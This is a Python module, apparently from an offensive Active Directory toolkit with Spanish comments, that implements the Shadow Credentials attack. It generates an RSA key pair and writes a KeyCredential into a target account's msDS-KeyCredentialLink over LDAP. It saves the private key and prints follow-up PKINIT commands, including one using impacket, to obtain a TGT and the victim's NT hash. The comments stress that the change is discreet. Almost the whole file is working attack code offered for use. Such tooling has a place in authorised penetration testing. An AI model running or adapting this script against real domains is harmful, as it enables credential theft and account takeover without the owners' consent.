# scripts/kerberos/credentials/shadow_credentials.py
#
# Técnica: Shadow Credentials
#
# Fundamento:
#   Desde Windows Server 2016, AD soporta PKINIT: autenticación Kerberos
#   con certificado/clave en vez de contraseña.
#
#   El atributo msDS-KeyCredentialLink en los objetos de usuario/equipo almacena
#   credenciales clave (KeyCredential) usadas por Windows Hello for Business,
#   Azure AD Join, etc.
#
#   Si tenemos GenericWrite sobre un objeto, podemos:
#     1. Generar un par de claves RSA/EC nuevo.
#     2. Construir una KeyCredential con la clave pública.
#     3. Escribirla en msDS-KeyCredentialLink del objetivo via LDAP.
#     4. Autenticarnos con PKINIT usando la clave privada → TGT.
#     5. Del AS-REP de PKINIT extraemos el NT hash via U2U.
#
#   Impacto: obtener NT hash del usuario objetivo sin conocer su contraseña.
#   El cambio es discreto (solo añade un valor al atributo, no modifica la cuenta).
#
#   Requisito: GenericWrite sobre el objeto objetivo.
#   Técnica documentada por Elad Shamir, 2021.

from scripts.base import BaseScript
from core.output import print_result, console
from core import session_db


class ShadowCredentialsScript(BaseScript):
    name = "shadow-credentials"
    description = "Añade KeyCredential en msDS-KeyCredentialLink → PKINIT → NT hash sin contraseña"

    examples = [
        {"flag": "--target-user",
         "desc": "Usuario sobre el que tienes GenericWrite (objetivo del ataque)",
         "good": "kerberos --script=shadow-credentials -t 10.129.1.5 -d CORP.LOCAL -u jsmith -p 'Pass123!' --target-user svcSQL",
         "bad": "kerberos --script=shadow-credentials ... --target-user Administrator  [necesitas GenericWrite sobre ese usuario — Administrator rara vez es modificable]"},
    ]

    def run(self, **kwargs):
        realm = (self.creds.domain or self.target.domain or "").upper()
        kdc = self.target.ip
        target_user = kwargs.get("target_user")

        if not realm: console.print("[red]Falta -d.[/red]"); return
        if not target_user: console.print("[red]Falta --target-user.[/red]"); return
        if not (self.creds.password or self.creds.hash):
            console.print("[red]Falta -p o -H.[/red]"); return

        print_result("KRB", kdc, "info",
                     f"shadow-credentials: añadiendo KeyCredential en {target_user}@{realm}")

        # Paso 1: generar par de claves RSA
        try:
            from Cryptodome.PublicKey import RSA
            key = RSA.generate(2048)
            priv_pem = key.export_key().decode()
            pub_pem = key.publickey().export_key().decode()
        except ImportError:
            console.print("[red]pycryptodomex necesario: pip install pycryptodomex[/red]")
            return

        print_result("KRB", kdc, "ok", "Par RSA-2048 generado")

        # Paso 2: construir KeyCredential y escribir en LDAP
        key_id = self._write_key_credential(kdc, realm, target_user, pub_pem)
        if not key_id:
            console.print("[red]No se pudo escribir msDS-KeyCredentialLink. "
                           "¿Tienes GenericWrite sobre el usuario?[/red]")
            return

        print_result("KRB", kdc, "ok",
                     f"KeyCredential escrita en {target_user} (id: {key_id[:16]}...)")

        # Guardar clave privada para PKINIT
        import tempfile, os
        priv_path = f"/tmp/shadow_{target_user}.pem"
        with open(priv_path, 'w') as f:
            f.write(priv_pem)
        os.chmod(priv_path, 0o600)

        print_result("KRB", kdc, "ok", f"Clave privada guardada: {priv_path}")
        console.print()
        console.print("[bold yellow]Siguiente paso: PKINIT con la clave privada:[/bold yellow]")
        console.print(f"  kerberos --script=pkinit -t {kdc} -d {realm} "
                       f"-u {target_user} --cert {priv_path}")
        console.print()
        console.print("[dim]O con impacket directamente:[/dim]")
        console.print(f"  impacket-gettgtpkinit {realm.lower()}/{target_user} "
                       f"-cert-pem {priv_path} /tmp/shadow_{target_user}.ccache")

        session_db.save_finding(kdc, "KRB", "shadow_credentials",
                                 f"{target_user}@{realm} → clave: {priv_path}")

        # Limpieza al terminar
        console.print()
        console.print("[bold red]IMPORTANTE:[/bold red] Limpia el KeyCredential tras el ataque:")
        console.print(f"  ldapmodify: eliminar el valor añadido en msDS-KeyCredentialLink de {target_user}")
        console.print(f"  (o usa: kerberos --script=shadow-credentials ... --cleanup --key-id {key_id})")

    def _write_key_credential(self, kdc, realm, target_user, pub_pem) -> str | None:
        try:
            from modules.ldap import LDAPModule
            from core.target import Target
            ldap = LDAPModule(Target(ip=kdc, domain=realm.lower()), self.creds)
            return ldap.write_key_credential(target_user, pub_pem)
        except (ImportError, Exception) as e:
            console.print(f"[dim]LDAP error: {e}[/dim]")
            return None
